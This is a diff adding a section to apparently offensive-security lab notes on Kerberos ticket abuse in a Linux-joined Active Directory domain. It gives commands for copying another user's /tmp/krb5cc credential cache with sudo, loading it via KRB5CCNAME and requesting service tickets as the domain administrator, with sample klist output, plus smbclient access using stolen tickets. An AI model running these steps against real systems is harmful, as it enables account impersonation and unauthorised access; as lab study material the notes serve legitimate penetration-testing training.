@@ -62,4 +62,32 @@ Using the klist command, we can verify that the tickets from the keytab have bee
 we can authenticate as the domain admin and access any resources they have access to.
   smbclient -k -U "CORP1.COM\administrator" //DC01.CORP1.COM/C$
 
-  ---------------------------------------------------------------------------------------------
+---------------------------------------------------------------------------------------------
+
+# Using credential cache file
+
+User's ccache file is stored in /tmp with a format like /tmp/krb5cc_<randomstring>. The file is typically only accessible by the owner.
+If we have privileged access, we can still load into our account
+
+    ls -al /tmp/krb5cc_*
+    sudo cp /tmp/krb5cc_607000500_3aeIA5 /tmp/krb5cc_minenow
+    sudo chown offsec:offsec /tmp/krb5cc_minenow
+    ls -al /tmp/krb5cc_minenow
+
+In order to use the ccache file, we need to set the KRB5CCNAME environment variable 
+
+    kdestroy
+    klist
+    export KRB5CCNAME=/tmp/krb5cc_minenow
+    klist:
+
+    07/30/2020 15:11:10  07/31/2020 01:11:10  krbtgt/CORP1.COM@CORP1.COM
+      renew until 08/06/2020 15:11:08
+    07/30/2020 15:11:41  07/31/2020 01:11:10  ldap/dc01.corp1.com@CORP1.COM
+      renew until 08/06/2020 15:11:08
+    07/30/2020 15:11:57  07/31/2020 01:11:10  MSSQLSvc/DC01.corp1.com:1433@CORP1.COM
+      renew until 08/06/2020 15:11:08
+
+We now have the administrator user's TGT in our credential cache and we can request service tickets on their behalf.
+    kvno MSSQLSvc/DC01.corp1.com:1433
+    klist
